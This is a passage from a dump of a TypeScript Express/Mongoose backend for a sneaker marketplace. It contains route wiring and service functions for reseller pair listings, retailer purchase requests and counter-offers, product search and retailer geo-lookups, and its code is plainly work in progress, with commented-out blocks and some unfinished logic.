import EngagementRouter from "../module/Engagement/Engagement.routes";
import ResellerRouter from "../module/Reseller/Reseller.routes";
import ProductRouter from "../module/Product/Product.routes";
import CartRouter from "../module/Cart/Cart.routes";
import OrderRouter from "../module/Order/Order.routes";
import ReportRouter from "../module/Report/Report.routes";
import PairsRouter from "../module/Pairs/Pairs.routes";
import PromotionRouter from "../module/Promotion/Promotion.routes";
import dashboardRouter from "../module/Dashboard/Dashboard.routes";


const allRouter = Router();


const moduleRoutes = [
    {
        path: '/auth',
        router: authRouter,
    },
    {
        path: '/user',
        router: userRouter,
    },
    {
        path: '/buyer',
        router: BuyerRouter,
    },
    {
        path: '/retailer',
        router: RetailerRouter,
    },
    {
        path: '/engagement',
        router: EngagementRouter,
    },
    {
        path: '/reseller',
        router: ResellerRouter,
    },
    {
        path: '/product',
        router: ProductRouter,
    },
    {
        path: '/cart',
        router: CartRouter,
    },
    {
        path: '/order',
        router: OrderRouter,
    },
    {
        path: '/report',
        router: ReportRouter,
    },
    {
        path: '/pair',
        router: PairsRouter,
    },
    {
        path: '/promotion',
        router: PromotionRouter,
    },
    {
        path: '/dashboard',
        router: dashboardRouter,
    },
  
];

moduleRoutes.forEach((route) => allRouter.use(route.path, route.router));

export default allRouter;
```

## File: src/app/module/Pairs/Pairs.service.ts
```typescript
import ApiError from "../../../error/ApiError";
import notification from "../../../helper/notification";
import { IJwtPayload } from "../../../interface/jwt.interface";
import deleteOldFile from "../../../utilities/deleteFile";
import { ENUM_NOTIFICATION_TYPE, ENUM_PAIR_REQUEST_STATUS, ENUM_PRODUCT_TYPE, ENUM_USER_Type } from "../../../utilities/enum";
import AuthModel from "../auth/auth.model";
import { IPairs } from "./Pairs.interface";
import {PairRequestModel, PairsModel} from "./Pairs.model";


//add new pairs to the reseller's listing
const addNewPairsToReseller = async (
    userDetails: IJwtPayload,
    files: Express.Multer.File[],
    payload: Partial<IPairs>
) => {

    const {profileId} = userDetails;

    // if (!files || files.length === 0) {
    //     throw new ApiError(400, "At least one pair image is required.");
    // }

    // const imageUrls = files.map(file => {
    //     // Assuming you have a function to upload the file and get its URL
    //     return `uploads/product-image/${file.filename}`; // Replace with actual URL generation logic
    // });

    // console.log("product images:",imageUrls);

    const { name, type, brand, details, variant,styleCode,askingPrice, sneakerAttributes, tshirtAttributes} = payload;

    const pairPayload: Record<string, unknown> = {
        name,
        type,
        brand,
        details,
        variant,
        styleCode,
        askingPrice,
    };

    // console.log("payload before:", pairPayload);

    if (type === ENUM_PRODUCT_TYPE.SNEAKERS) {
        //  console.log("entered 1");
      pairPayload.sneakerAttributes = sneakerAttributes;
      pairPayload.tshirtAttributes = null;
    }

    if (type === ENUM_PRODUCT_TYPE.CLOTHING) {
        //  console.log("entered 2");
      pairPayload.tshirtAttributes = tshirtAttributes;
      pairPayload.sneakerAttributes = null;
    }

    //  console.log("payload after:", pairPayload);


    const newPairs = new PairsModel({
        resellerId: profileId,
        images:  [],
        ...pairPayload,
    });

    await newPairs.save();

    return newPairs;

};

//edit pairs details by the reseller
const editPairsDetails = async (
    userDetails: IJwtPayload, 
    pairId: string,
    files: Express.Multer.File[],
     payload: Partial<IPairs>
    ) => {

    const {profileId} = userDetails;

    const product = await PairsModel.findOne({ _id: pairId, resellerId: profileId });

    if (!product) {
        throw new ApiError(404, "Product not found or you do not have permission to edit this product.");
    }

    const existingImages = product.images || [];

    if (files && files.length > 0) {
        const imageUrls = files.map(file => {
            return `uploads/product-image/${file.filename}`;
        });
        product.images = imageUrls;
    }

    console.log("edit pair payload",payload);

    Object.assign(product, payload);

    await product.save();

    if(!product){
        throw new ApiError(500,"Failed to edit product.");
    }

    //delete old images from server if new images are uploaded
    if (files && files.length > 0 && existingImages.length > 0) {
        existingImages.forEach( (imageUrl:any) => {
            // Implement your logic to delete the image file from the server
           deleteOldFile(imageUrl);
        });
    }

    return product;
};



const getMyListedPairs = async (userDetails: IJwtPayload,query: Record<string,unknown>) => {

    const { profileId } = userDetails;

    const { visiblityStatus, soldStatus } = query;

    const filter: Record<string, any> = {
        resellerId: profileId,
    };

    if (visiblityStatus !== undefined) {
        filter.isVisibleToStore = visiblityStatus;
    }

    if (soldStatus !== undefined) {
        filter.isSold = soldStatus;
    }

    const pairs = await PairsModel.find(filter).lean();

    return {
        pairs,
        pairCount: pairs.length
    };
}

const getSinglePairDetails = async (pairId: string) => {

    // console.log(pairId);

    const pair = await PairsModel.findById(pairId).lean();

    // console.log(pair);

    if(!pair){
        throw new ApiError(404,"Pair detail not found.");
    }

    return pair;
    
}


//retailer
//retailer makes request for a pair to the reseller
const makeRequestForPairService = async (userDetails: IJwtPayload, payload: any) => {
    const {profileId} = userDetails;

    const {pairId, quantity, variant, askingPrice,offerPrice, validityHours, note, dealCompletionType} = payload;

    const pair: any = await PairsModel.findById(pairId).lean();

    if (!pair) {
        throw new ApiError(404, "Pairs not found.");
    }

    if (pair.resellerId.toString() === profileId) {
        throw new ApiError(400, "You cannot make a request for your own pairs.");
    }

    //check if the quantity is valid or not
    const pairStock = pair.variants.find( (item:any) =>  item?.size == variant?.size.toString() && item?.gender == variant?.gender );

    if (!pairStock) {
        throw new ApiError( 404,    "Selected variant not found." );
    }

    if(pairStock?.stock < quantity){
        throw new ApiError(400,"Your selected quantity exceeds pair's current stock.");
    }

    const newPairRequest = new PairRequestModel({
        resellerId: pair?.resellerId,
        retailerId: profileId,
        pairId,
        quantity,
        variant,
        askingPrice: pair?.askingPrice,
        offerHistory: [
            {
                offeredBy: ENUM_USER_Type.RETAILER,
                price: offerPrice,
                // note: note || ""
            }
        ],
        status: ENUM_PAIR_REQUEST_STATUS.PENDING,
        note,
        validity: {
            validForHours: validityHours,
            from: new Date(),
            to: new Date(Date.now() + validityHours * 60 * 60 * 1000)
        },
        // dealCompletionType
    });

    await newPairRequest.save();

    //send notification to the reseller about the new pair request (this can be implemented using a notification service or system)
    await notification.createNotification({
        toId: pair?.resellerId,
        toModel: "Reseller",
        title: "You have received a pair request.",
        description: "You have received a new pair request offer. Kindly response to proceed the deal done.",
        // message?: string;
        type: ENUM_NOTIFICATION_TYPE.NEW_PAIR_REQUEST,
        referenceId: newPairRequest?._id,
        referenceModel: "PairRequestModel",
        metadata: {}
    });

    return newPairRequest;

};

const getAllPairRequestsForRetailer = async (userDetails: IJwtPayload, query: Record<string, unknown>) => {
    const {profileId} = userDetails;

    const {status = 'all'} = query;

    let filter: Record<string, any> = { retailerId: profileId };

    if (status !== "all") {
        filter.status = status;
    }

    const pairRequests = await PairRequestModel.find(filter).lean();
    

    return pairRequests;
}

const getAllResellerWithLowStockShoes = async () => {

    //get all reseller with shoe
}

const getResellerDetailWithShoes = async () => {

    //when this api is being called 
    //analytics model will be excuted here.

    
}


//get all pair requests for the reseller
const getAllPairRequestsForReseller = async (userDetails: IJwtPayload, query: Record<string, unknown>) => {
    const {profileId} = userDetails;

    const {status = 'all'} = query;

    let filter: Record<string, any> = { resellerId: profileId };

    if (status !== "all") {
        filter.status = status;
    }

    const pairRequests = await PairRequestModel.find(filter).lean();
    

    return pairRequests;
}

const getSInglePairRequestService = async (pairRequestId: string) => {

    const pairRequest = await PairRequestModel.findById(pairRequestId).lean();

    if(!pairRequest){
        throw new ApiError(404,"Pair request not found.");
    }

    return pairRequest;
}

const acceptPairRequest = async (userDetails: IJwtPayload, pairRequestId: string) => {
    const {profileId} = userDetails;

    const pairRequest:any = await PairRequestModel.findById(pairRequestId);

    if (!pairRequest) {
        throw new ApiError(404, "Pair request not found to accept.");
    }

    if (pairRequest.resellerId.toString() !== profileId) {
        throw new ApiError(403, "You can not accept this pair request.");
    }

    pairRequest.status = ENUM_PAIR_REQUEST_STATUS.ACCEPTED;
    await pairRequest.save();

    //adjust the quantity of the pairs based on the accepted request
    // await PairsModel.updateOne(
    //     {
    //         _id: pairRequest?.pairId,
    //         "variants.gender": pairRequest?.variant?.gender,
    //         "variants.size": pairRequest?.variant?.size,
    //     },
    //     {
    //         $inc: {
    //             "variants.$.stock": -pairRequest?.quantity,
    //         },
    //     }
    // );
    const adjustPairStock = await PairsModel.findOneAndUpdate(
        {
            _id: pairRequest?.pairId,
            variants: {
                $elemMatch: {
                    gender: pairRequest?.variant?.gender,
                    size: pairRequest?.variant?.size,
                    stock: { $gte: pairRequest?.quantity },
                },
            },
        },
        {
            $inc: {
                "variants.$.stock": -pairRequest?.quantity,
            },
        },
        { new: true }
    );

    if (!adjustPairStock) {
        throw new ApiError( 400,"Your selected quantity exceeds pair's current stock.");
    }

    //send notification to the retailer about the acceptance of their pair request (this can be implemented using a notification service or system)
    //notification to reseller
    await Promise.all([
        notification.createNotification({
            toId: profileId,
            toModel: "Reseller",
            title: "You have accepted a pair request.",
            description: "You have acepted a pair request offer",
            // message?: string;
            type: ENUM_NOTIFICATION_TYPE.ACCEPTED_PAIR_REQUEST,
            referenceId: pairRequest._id,
            referenceModel: "PairRequestModel",
            metadata: {}
        }),

        //notification to retailer
        notification.createNotification({
            toId: pairRequest?.retailerId,
            toModel: "Retailer",
            title: "Your new pair request is accepted.",
            description: "Reseller has accepted your pair request offer.",
            // message?: string;
            type: ENUM_NOTIFICATION_TYPE.ACCEPTED_PAIR_REQUEST,
            referenceId: pairRequest._id,
            referenceModel: "PairRequestModel",
            metadata: {}
        }),
    ]);

    return null;
};

const rejectPairRequest = async (userDetails: IJwtPayload, pairRequestId: string) => {
    const {profileId} = userDetails;

    const pairRequest = await PairRequestModel.findById(pairRequestId);

    if (!pairRequest) {
        throw new ApiError(404, "Pair request not found.");
    }

    if (pairRequest.resellerId.toString() !== profileId) {
        throw new ApiError(403, "You can not reject this pair request.");
    }

    pairRequest.status = ENUM_PAIR_REQUEST_STATUS.REJECTED;
    await pairRequest.save();

    await notification.createNotification({
        toId: pairRequest?.retailerId,
        toModel: "Retailer",
        title: "Your is pair request is rejected",
        description: "Your request to resource new pair is rejected by the reseller.",
        // message?: string;
        type: ENUM_NOTIFICATION_TYPE.REJECTED_PAIR_REQUEST,
        referenceId: pairRequest._id,
        referenceModel: "PairRequestModel",
        metadata: {}
    });

    return null;
};

const proposeCounterOfferToPairRequest = async (userDetails: IJwtPayload, payload: any) => {
    const {profileId,authId} = userDetails;

    const auth:any = AuthModel.findById(authId).select("role").lean();

    const {pairRequestId, offerPrice,  dealCompletionType} = payload;

    const pairRequest = await PairRequestModel.findById(pairRequestId);

    if (!pairRequest) {
        throw new ApiError(404, "Pair request not found.");
    }

    if ( pairRequest?.resellerId.toString() !== profileId || pairRequest?.retailerId.toString() !== profileId) {
        throw new ApiError(403, "You can not make counter offer of this pair request.");
    }

    pairRequest.status = ENUM_PAIR_REQUEST_STATUS.COUNTER;

    pairRequest.offerHistory.push({
        offeredBy: auth?.role,
        price: offerPrice,
        // note: payload.note || ""
    });

    if(dealCompletionType) pairRequest.dealCompletionType = dealCompletionType;

    await pairRequest.save();

    return null;
};


const PairsServices = { 
    addNewPairsToReseller,
    editPairsDetails,
    getMyListedPairs,
    getSinglePairDetails,

    makeRequestForPairService,
    getAllPairRequestsForRetailer,

    getAllPairRequestsForReseller,
    getSInglePairRequestService,
    acceptPairRequest,
    rejectPairRequest,
    proposeCounterOfferToPairRequest
};

export default PairsServices;
```

## File: src/app/module/Product/Product.service.ts
```typescript
import mongoose from "mongoose";
import ApiError from "../../../error/ApiError";
import { IJwtPayload } from "../../../interface/jwt.interface";
import deleteOldFile from "../../../utilities/deleteFile";
import { IProduct, TAddProductPayload } from "./Product.interface";
import {ProductModel, ProductVariantModel, RecentSearchModel} from "./Product.model";
import { ENUM_PRODUCT_TYPE } from "../../../utilities/enum";




const addProductService = async (
  userDetails: IJwtPayload,
  files: Express.Multer.File[],
  payload: TAddProductPayload
) => {

  const {profileId} = userDetails;

  const {
    // retailerId,
    productType,
    name,
    brand,
    description,
    // images,
    basePrice,
    styleCode,
    availability,
    sneakerAttributes,
    tshirtAttributes,
    variants,
  } = payload;

  // if (!files || files.length === 0) {
  //       throw new ApiError(400, "At least one product image is required.");
  //   }

    // const imageUrls = files.map(file => {
    //     // Assuming you have a function to upload the file and get its URL
    //     return `uploads/product-image/${file.filename}`; // Replace with actual URL generation logic
    // });

    // console.log("product images:",imageUrls);

  

  const duplicateSkuCheck = new Set();

  // for (const variant of variants) {
  //   const sku = variant.sku.trim().toUpperCase();

  //   if (duplicateSkuCheck.has(sku)) {
  //     throw new Error(`Duplicate SKU found: ${sku}`);
  //   }

  //   duplicateSkuCheck.add(sku);
  // }

  // const duplicateVariantCheck = new Set();

  // for (const variant of variants) {
  //   const key = `${variant.size.trim().toUpperCase()}-${variant.color
  //     .trim()
  //     .toUpperCase()}`;

  //   if (duplicateVariantCheck.has(key)) {
  //     throw new Error(
  //       `Duplicate variant found for size ${variant.size} and color ${variant.color}`
  //     );
  //   }

  //   duplicateVariantCheck.add(key);
  // }

  // const existingSkus = await ProductVariant.find({
  //   sku: {
  //     $in: variants.map((variant) => variant.sku.trim().toUpperCase()),
  //   },
  // }).select("sku");

  // if (existingSkus.length > 0) {
  //   throw new Error(
  //     `SKU already exists: ${existingSkus.map((item) => item.sku).join(", ")}`
  //   );
  // }

  const session = await mongoose.startSession();

  try {
    session.startTransaction();

    const productPayload: Record<string, unknown> = {
      retailerId: profileId,
      type: productType,
      name: name.trim(),
      brand: brand.trim(),
      description: description.trim(),
      styleCode,
      // images: imageUrls || [],
      price: basePrice,
      // gender,
      availability,
    };

    if (productType === ENUM_PRODUCT_TYPE.SNEAKERS) {
      productPayload.sneakerAttributes = sneakerAttributes;
      productPayload.tshirtAttributes = null;
    }

    if (productType === ENUM_PRODUCT_TYPE.CLOTHING) {
      productPayload.tshirtAttributes = tshirtAttributes;
      productPayload.sneakerAttributes = null;
    }

    const createdProduct = await ProductModel.create([productPayload], {
      session,
    });

    const product = createdProduct[0];

    const variantPayload = variants.map((variant) => ({
      productId: product._id,
      retailerId:profileId,
      size: variant?.size.trim(),
      color: variant?.color || "",
      sku: variant?.sku || "",
      price: variant?.price || 0,
      stock: variant?.stock,
      reservedStock: 0,
      isActive: true,
    }));

    const createdVariants = await ProductVariantModel.insertMany(variantPayload, {
      session,
    });

    await session.commitTransaction();

    return {
      product,
      variants: createdVariants,
    };
  } catch (error) {
    await session.abortTransaction();
    throw error;
  } finally {
    await session.endSession();
  }
};

const addProductService2 = async (
  userDetails: IJwtPayload,
  files: Express.Multer.File[],
   productData: Partial<IProduct>
  ) => {
    const {profileId} = userDetails;

    if (!files || files.length === 0) {
        throw new ApiError(400, "At least one product image is required.");
    }

    const imageUrls = files.map(file => {
        // Assuming you have a function to upload the file and get its URL
        return `uploads/product-image/${file.filename}`; // Replace with actual URL generation logic
    });

    // productData.images = imageUrls;
    
    const newProduct = new ProductModel({
      retailerId: profileId,
      images: imageUrls,
        ...productData,
    }); 

    await newProduct.save();

    if(!newProduct){
        throw new ApiError(500,"Failed to add product.");
    }

    return newProduct;
}

const editProductService = async (
    userDetails: IJwtPayload,
    productId: string,
    files: Express.Multer.File[],
    productData: Partial<IProduct>
) => {
    const {profileId} = userDetails;

    const product = await ProductModel.findOne({ _id: productId, retailerId: profileId });

    if (!product) {
        throw new ApiError(404, "Product not found or you do not have permission to edit this product.");
    }

    const existingImages = product.images || [];

    if (files && files.length > 0) {
        const imageUrls = files.map(file => {
            return `uploads/product-image/${file.filename}`;
        });
        product.images = imageUrls;
    }

    Object.assign(product, productData);

    await product.save();

    if(!product){
        throw new ApiError(500,"Failed to edit product.");
    }

    //delete old images from server if new images are uploaded
    if (files && files.length > 0 && existingImages.length > 0) {
        existingImages.forEach( (imageUrl:any) => {
            // Implement your logic to delete the image file from the server
           deleteOldFile(imageUrl);
        });
    }

    return product;
}

const deleteProductService = async (userDetails: IJwtPayload, productId: string) => {
    const {profileId} = userDetails;

    const deleted = await ProductModel.findOneAndDelete({ _id: productId, retailerId: profileId });

    if (!deleted) {
        throw new ApiError(404, "Product not found or you do not have permission to delete this product.");
    }

    return null;
}



// product-search.service.ts

const searchProductsService = async (userDetails: IJwtPayload, query: Record<string,unknown>) => {
    const {profileId} = userDetails;
    const {searchtext,type} = query;

    /*
     |--------------------------------------------------------------------------
     | 2. SEARCH PRODUCTS
     |--------------------------------------------------------------------------
     */
    let filter: Record<string, unknown> = {
      $or: [
        {
          name: {
            $regex: searchtext,
            $options: "i",
          },
        },
        {
          brand: {
            $regex: searchtext,
            $options: "i",
          },
        },
      ],
    };

     if(type){
        filter.type = type;
     }

    const products = await ProductModel.find(filter)
      .select("_id name brand price image totalSearchCount")
      .limit(10)
      .lean();

       /*
     |--------------------------------------------------------------------------
     | 3. INCREASE totalSearchCount
     |--------------------------------------------------------------------------
     | Increment count for searched products
     */

    if (products.length > 0) {
      const productIds = products.map((product) => product._id);

      await ProductModel.updateMany(
        {
          _id: {
            $in: productIds,
          },
        },
        {
          $inc: {
            totalSearchCount: 1,
          },
        }
      );
    }

      const recent = await RecentSearchModel.findOneAndUpdate(
      {
        buyerId: profileId,
        keyword: searchtext,
      },
      {
        searchedAt: new Date(),
      },
      {
        upsert: true,
        new: true,
      }
    );

    

    if(!recent){
        const newRecentSearch = await RecentSearchModel.create(
            {
                buyerId: profileId,
                keyword: searchtext,
                searchedAt: new Date(),
            }
        );

        if(!newRecentSearch){
            throw new ApiError(500,"Failed to save recent search");
        }
    }


    return products;
 
};

const getTrendingNowAndRecentSearchesSevice = async (userDetails: IJwtPayload) => {
    const {profileId} = userDetails;


    const recentSearches = await RecentSearchModel.find({
      buyerId: profileId,
    })
      .sort({ searchedAt: -1 })
      .limit(10)
      .select("keyword")
      .lean();

    /*
     |--------------------------------------------------------------------------
     | 5. GET TRENDING PRODUCTS
     |--------------------------------------------------------------------------
     */

    const trendingProducts = await ProductModel.find({})
      .sort({ totalSearchCount: -1 })
      .limit(10)
      .select("_id name brand price image totalSearchCount")
      .lean();

    /*
     |--------------------------------------------------------------------------
     | 6. RETURN RESPONSE
     |--------------------------------------------------------------------------
     */

    return {
      recentSearches,
      trendingProducts,
    };
 
};



const getProductDetailsByIdService = async (productId: string) => {

    const product = await ProductModel.findById(productId);

    if(!product){
        throw new ApiError(500,"Failed to get details of the product");
    }

    product.totalSearchCount += 1;

    await product.save();

    return product;
}

const deleteRecentSearchService = async (userDetails: IJwtPayload, recentSearchId: string) => {

    const {profileId} = userDetails;

    const deleted = await RecentSearchModel.findOneAndDelete({
        _id: recentSearchId,
        buyerId: profileId,
    });

    if(!deleted){
        throw new ApiError(500,"Failed to delete recent search");
    }

    return null;
}

const ProductServices = { 
    addProductService,
    editProductService,
    deleteProductService,
    searchProductsService,
    getTrendingNowAndRecentSearchesSevice,
    getProductDetailsByIdService,
    deleteRecentSearchService
 };

export default ProductServices;
```

## File: src/app/module/Retailer/Retailer.service.ts
```typescript
import mongoose from "mongoose";
import ApiError from "../../../error/ApiError";
import { IJwtPayload } from "../../../interface/jwt.interface";
import { ENUM_PRODUCT_AVAILABILITY } from "../../../utilities/enum";
import { OrderItemModel, OrderModel } from "../Order/Order.model";
import { ProductModel } from "../Product/Product.model";
import { IOperationHour, IRetailer } from "./Retailer.interface";
import RetailerModel from "./Retailer.model";
import { ReviewModel } from "../Engagement/Engagement.model";
import deleteOldFile from "../../../utilities/deleteFile";

//get all nearby retailer for buyer 
const filterNearbyRetailers = async (query: Record<string, unknown>) => {
    const { latitude, longitude} = query;

    if (typeof latitude !== "number" || typeof longitude !== "number" ) {
        throw new ApiError(400, "Invalid query parameters. Latitude, longitude");
    }

    const maxDistance = 10000; // Set a default max distance (in meters) for nearby retailers

    const nearbyRetailers = await RetailerModel.find({
        isApproved: true, // Only include approved retailers    
        location: {
            $near: {
                $geometry: {
                    type: "Point",
                    coordinates: [longitude, latitude],
                },
                $maxDistance: maxDistance,
            },
        },
    }).select("name").lean();

    return nearbyRetailers;
};

//buyer map page

const getAllNearbyRetailersForMap = async (query: Record<string, unknown>) => {
    const { latitude, longitude } = query;

    if (typeof latitude !== "number" || typeof longitude !== "number") {
        throw new ApiError(
            400,
            "Invalid query parameters. Latitude, longitude"
        );
    }

    const maxDistance = 10000;

    const nearbyRetailers = await RetailerModel.aggregate([
        {
            $geoNear: {
                near: {
                    type: "Point",
                    coordinates: [longitude, latitude],
                },
                distanceField: "distance",
                maxDistance,
                spherical: true,
                query: {
                    isApproved: true,
                },
            },
        },

        {
            $lookup: {
                from: "products",
                let: {
                    retailerId: "$_id",
                },
                pipeline: [
                    {
                        $match: {
                            $expr: {
                                $and: [
                                    {
                                        $eq: [
                                            "$retailerId",
                                            "$$retailerId",
                                        ],
                                    },
                                    {
                                        $eq: [
                                            "$availability",
                                            ENUM_PRODUCT_AVAILABILITY.ACTIVE,
                                        ],
                                    },
                                ],
                            },
                        },
                    },
                    {
                        $count: "total",
                    },
                ],
                as: "productStats",
            },
        },

        {
            $addFields: {
                productCount: {
                    $ifNull: [
                        {
                            $arrayElemAt: [
                                "$productStats.total",
                                0,
                            ],
                        },
                        0,
                    ],
                },
            },
        },

        {
            $project: {
                productStats: 0,
            },
        },

        {
            $project: {
                _id: 1,
                name: 1,
                // image: 1,
                address: 1,
                productCount: 1,
                distance: 1,
            },
        },

        {
            $sort: {
                distance: 1,
            },
        },
        {
            $limit: 10
        },
    ]);

    return nearbyRetailers;
};

const getRetailerDetailWithProduct = async (retailerId: string) => {

    const retailerObjectId = new mongoose.Types.ObjectId(retailerId);

    const retailer = await RetailerModel.findById(retailerId).lean();

    const products = await ProductModel.find({
        retailerId: retailerId,
        availablity: ENUM_PRODUCT_AVAILABILITY.ACTIVE
    }).lean();




    const result = await ReviewModel.aggregate([
    {
        $match: {
            retailerObjectId,
        },
    },

    {
        $facet: {
        // Total review count
        reviewSummary: [
            {
            $group: {
                _id: null,
                totalReviews: { $sum: 1 },

                averageOverallRating: {
                $avg: "$overallrating",
                },

                averageCustomerServiceRating: {
                $avg: "$customerServiceRating",
                },

                averageAuthenticityRating: {
                $avg: "$authenticityRating",
                },

                averagePickupSpeedRating: {
                $avg: "$pickupSpeedRating",
                },

                averagePriceRating: {
                $avg: "$priceRating",
                },

                averageStoreExperienceRating: {
                $avg: "$storeExperienceRating",
                },

                averageStaffHelpfulnessRating: {
                $avg: "$staffHelpfulnessRating",
                },
            },
            },
        ],

        // Star-wise distribution
        ratingDistribution: [
            {
            $group: {
                _id: "$overallrating",
                count: {
                $sum: 1,
                },
            },
            },
            {
            $sort: {
                _id: -1,
            },
            },
        ],
        },
    },
    ]);

    const summary = result[0]?.reviewSummary?.[0];

    const distribution:any = {
        1: 0,
        2: 0,
        3: 0,
        4: 0,
        5: 0,
    };

    result[0]?.ratingDistribution?.forEach((item:any) => {
        distribution[item._id] = item.count;
    });

    const retailerReview: any = {


        totalReviews: summary?.totalReviews ?? 0,

        overallRating: Number(
            (summary?.averageOverallRating ?? 0).toFixed(1)
        ),

        ratings: distribution,

        customerServiceRating: Number(
            (summary?.averageCustomerServiceRating ?? 0).toFixed(1)
        ),

        authenticityRating: Number(
            (summary?.averageAuthenticityRating ?? 0).toFixed(1)
        ),

        pickupSpeedRating: Number(
            (summary?.averagePickupSpeedRating ?? 0).toFixed(1)
        ),

        priceRating: Number(
            (summary?.averagePriceRating ?? 0).toFixed(1)
        ),

        storeExperienceRating: Number(
            (summary?.averageStoreExperienceRating ?? 0).toFixed(1)
        ),

        staffHelpfulnessRating: Number(
            (summary?.averageStaffHelpfulnessRating ?? 0).toFixed(1)
        ),
    };

    return {
        retailer,
        products,
        retailerReview
    }

}

//get inventory of a retailer
const getRetailerInventory = async (userDetails: IJwtPayload,query: Record<string, unknown>) => {
    const {profileId} = userDetails;

    const {inventoryType} = query


    const inventory = await ProductModel.find({ retailerId: profileId, availability: inventoryType }).sort({ createdAt: -1 }).lean();

    if(!inventory){
        throw new ApiError(404, "Retailer not found.");
    }

    return inventory;

}

const getAllOrdersOfRetailer = async (userDetails: IJwtPayload, query: Record<string, unknown>) => {
    const {profileId} = userDetails;

    const {orderStatus} = query;

    const orders = await OrderItemModel.find({ retailerId: profileId, status: orderStatus }).sort({ createdAt: -1 }).lean();

    if(!orders){
        throw new ApiError(404, "No orders found for this retailer.");
    }

    return orders;
}


//retailer profile

//update retailer operation hours

const toggleOperationHour = async (userDetails: IJwtPayload, query: Record<string, unknown>) => {
    const {profileId} = userDetails;

    const { day } = query;


    const retailer:any = await RetailerModel.findOne({
        _id: profileId,
        // "operationHour.day": day
    });

    // console.log("retailer:", retailer);

    const operationHour = retailer?.operationHour.find( (item:IOperationHour) => item?.day === day);

    // console.log("operation hour:", operationHour);

    operationHour.isOpen = !operationHour.isOpen;

    await retailer.save();

    return null;
};

//retailer profile
const updateRetailerProfileService = async (
    userDetails: IJwtPayload,
    profileImage: Express.Multer.File | undefined,
    coverImage: Express.Multer.File | undefined,
    payload: any
    ) => {

    const { profileId } = userDetails;
    
    let {name,details,phone,website,address,latitude,longitude} = payload;

    console.log("profileImage, coverImage", profileImage, coverImage);
    
    const profile:any = await RetailerModel.findById(profileId).lean();
    if (!profile) {
        throw new ApiError(404, "Buyer not found to update.");
    }

    
    const updateData: any = {
        name,
        details,
        phone,
        website,
        address,
    };
    
    if(profileImage){
        updateData.image = `uploads/profile-image/${profileImage?.filename}`;

        deleteOldFile(profile?.image);
    }

    if(coverImage){
        updateData.coverImage = `uploads/cover-image/${coverImage?.filename}`;

        deleteOldFile(profile?.coverImage);
    }

    if (latitude != null && longitude != null) {
        updateData["location.coordinates"] = [
            Number(longitude),
            Number(latitude),
        ];
    }

    const updatedProfile = await RetailerModel.findByIdAndUpdate(
        profileId,
        {
            $set: updateData,
        },
        {
            new: true,
        }
    );

    

    return updatedProfile;
};

//add rtailer license and store image
const addRetailerLicense = async (
    userDetails: IJwtPayload,
    licenseFile: Express.Multer.File | undefined,
    coverImage: Express.Multer.File | undefined,
    payload: any
    ) => {

    const { profileId } = userDetails;
    
    let {address,latitude,longitude} = payload;

    // console.log("profileImage, coverImage", profileImage, coverImage);
    
    const profile:any = await RetailerModel.findById(profileId).lean();

    if (!profile) {
        throw new ApiError(404, "Retailer not found to add info.");
    }

    
    const updateData: any = {
        address,
    };
    
    if(licenseFile){
        updateData.image = `uploads/retailer-file/${licenseFile?.filename}`;

        // deleteOldFile(profile?.image);
    }

    if(coverImage){
        updateData.coverImage = `uploads/cover-image/${coverImage?.filename}`;

        // deleteOldFile(profile?.coverImage);
    }

    if (latitude != null && longitude != null) {
        updateData["location.coordinates"] = [
            Number(longitude),
            Number(latitude),
        ];
    }

    const updatedProfile = await RetailerModel.findByIdAndUpdate(
        profileId,
        {
            $set: updateData,
        },
        {
            new: true,
        }
    );

    

    return updatedProfile;
};


//retailer home page


//retailer branch
const addNewBranch = async (
    userDetails: IJwtPayload,
    profileImage: Express.Multer.File,
    coverImage: Express.Multer.File,
     payload: Partial<IRetailer>
) => {

    const {authId,profileId} = userDetails;

    // console.log("Retailer branch cover and profile image:",profileImage,coverImage);

    const parentStore:any = await RetailerModel.findById(profileId).select("email").lean();

    const branchPayload: any = {
        parentStore: profileId,
        authId,
        email: parentStore?.email,
       ...payload 
    }

    if(profileImage){
        branchPayload.image = `uploads/profile-image/${profileImage?.filename}`;

        // deleteOldFile(profile?.image);
    }

    if(coverImage){
        branchPayload.coverImage = `uploads/cover-image/${coverImage?.filename}`;

        // deleteOldFile(profile?.coverImage);
    }


    const branch = await RetailerModel.create(branchPayload);

    if(!branch){
        throw new ApiError(500,"Failed to create new branch store.");
    }

    return null;
}

const getAllBranch = async (userDetails: IJwtPayload) => {

    const {profileId} = userDetails;

    const branches = await RetailerModel.find({parentStore: profileId}).lean();

    return branches;

}





//dashboard

const getAllRetailerStoreService = async (query: Record<string,unknown>) => {

    let {page, searchText, approvalStatus} = query;

    let filter: any= {};

    //if approvalStatus is true
    if(approvalStatus){
        filter.isApproved = approvalStatus === "true" ? true : false;
    }

    //if searchText is true
    if(searchText){
        const users = await RetailerModel.find({
            ...filter,
             $or: [
                    { name: { $regex: searchText, $options: "i" } },
                    { email: { $regex: searchText, $options: "i" } },
                ]
        }) .populate({path: "auth", select:"isBlocked"}).lean();

        return users;

    }


    //pagination
    page = parseInt(page as any) || 1;
    let limit = 10;
    let skip = (page as number - 1) * limit;


    const [users, totalUser] = await Promise.all([

        RetailerModel.find(filter)
            .populate({path: "auth", select:"isBlocked"})
                .sort({createdAt: -1})
                    .skip(skip).limit(limit)
                        .lean(),
    
        RetailerModel.countDocuments({})
    ])

    const totalPage = Math.ceil(totalUser / limit);

    return {
        meta:{page,limit: 10,total: totalUser, totalPage},
        stores: users
    };
}

const approveRetailerService = async (id: string) => {

    const approvedRetailer = await RetailerModel.findById(id).select("name isApproved");

    if(!approvedRetailer){
        throw new ApiError(404, "Retailer not found to approve.");
    }

    approvedRetailer.isApproved = !approvedRetailer.isApproved;

    await approvedRetailer.save();

    let msg = approvedRetailer.isApproved ? "approved" : "disapproved";

    //send notification to retailer about approval status
    // await NotificationModel.create({
    //     user: approvedRetailer._id,
    //     title: `Your store has been ${msg}`,
    //     description: `Your store "${approvedRetailer.name}" has been ${msg} by admin. You can now ${approvedRetailer.isApproved ? "start listing your products and receive orders." : "not receive orders until it's approved again."}`,
    //     type: ENUM_NOTIFICATION_TYPE.RETAILER_APPROVAL_STATUS,
    //     referenceId: approvedRetailer._id.toString(),
    //     referenceModel: "Retailer"
    // });

    return msg;
}



const RetailerServices = { 
    filterNearbyRetailers,
    getAllNearbyRetailersForMap,
    getRetailerInventory,
    getAllOrdersOfRetailer,
    toggleOperationHour,

    addNewBranch,
    getAllBranch,

    updateRetailerProfileService,
    addRetailerLicense,
};


export default RetailerServices;
```

## File: src/utilities/enum.ts
```typescript
// import { CANCELLED } from "dns"

export const ENUM_USER_Type = {
